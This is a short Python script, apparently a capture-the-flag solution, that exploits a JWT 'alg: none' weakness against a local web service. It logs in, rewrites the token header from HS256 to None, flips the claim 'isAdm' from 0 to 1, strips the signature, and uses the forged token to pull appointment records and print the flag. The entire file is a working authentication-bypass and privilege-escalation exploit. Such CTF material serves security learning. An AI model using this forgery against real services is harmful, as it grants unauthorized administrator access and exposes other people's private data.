from base64 import b64decode, b64encode

import requests

backend_url = "http://127.0.0.1:1337"

# login and request the JWT token
data = {"username": "ghost"}
response = requests.post(f"{backend_url}/login", data=data)
json_data = response.json()
token = json_data["token"]

# split token into three parts
meta, claims, signature = token.split(".")

# decode meta, replace type to None and reencode
meta_decoded = b64decode(meta + "=====", validate=False).decode()
meta_decoded = meta_decoded.replace("HS256", "None")
meta = b64encode(meta_decoded.encode()).decode()

# decode claims, replace isAdm:0 to isAdm:1
claims_decoded = b64decode(claims + "=====", validate=False).decode()
claims_decoded = claims_decoded.replace('"isAdm":0', '"isAdm":1')
claims = b64encode(claims_decoded.encode()).decode()

# get rid of equal signs (padding)
meta = meta.replace("=", "")
claims = claims.replace("=", "")

# construct new JWT
new_jwt = f"{meta}.{claims}."

# get appointments with new token
headers = {"Authorization": f"Bearer {new_jwt}"}
response = requests.get(f"{backend_url}/appointments", headers=headers)
for item in response.json()["appointments"]:
    if item["name"].startswith("cq23"):
        print("Flag:", item["name"])
